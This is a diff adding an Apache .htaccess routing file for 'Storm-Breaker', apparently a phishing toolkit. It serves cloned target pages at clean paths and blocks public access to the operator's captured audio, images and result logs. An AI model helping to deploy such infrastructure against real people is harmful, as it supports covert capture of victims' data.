@@ -1,0 +1,37 @@
+# Storm-Breaker — front-controller routing.
+#
+# Real files / dirs (panel.php, login.php, api/*, assets/*, etc.) are served
+# directly. Anything else falls through to router.php so cloned targets can
+# live at clean top-level paths like /<slug>.
+#
+# Operator-only data is blocked here as a defence-in-depth on top of the
+# router's path checks: even a misconfigured router shouldn't ever expose
+# captures, audio, result logs, or metadata.
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Don't rewrite real files or directories.
+    RewriteCond %{REQUEST_FILENAME} -f [OR]
+    RewriteCond %{REQUEST_FILENAME} -d
+    RewriteRule ^ - [L]
+
+    # Block direct access to operator-only paths inside any target dir.
+    RewriteRule ^targets/[^/]+/(captures|audio)/ - [F]
+    RewriteRule ^targets/[^/]+/(result\.txt|meta\.json)$ - [F]
+
+    # Everything else goes to the front-controller.
+    RewriteRule ^ router.php [L]
+</IfModule>
+
+# Hide dotfiles and internal config from web access.
+<FilesMatch "(^\.|\.json$|^Settings\.json$)">
+    Require all denied
+</FilesMatch>
+
+# Reasonable default headers.
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-Frame-Options "SAMEORIGIN"
+    Header set Referrer-Policy "strict-origin-when-cross-origin"
+</IfModule>
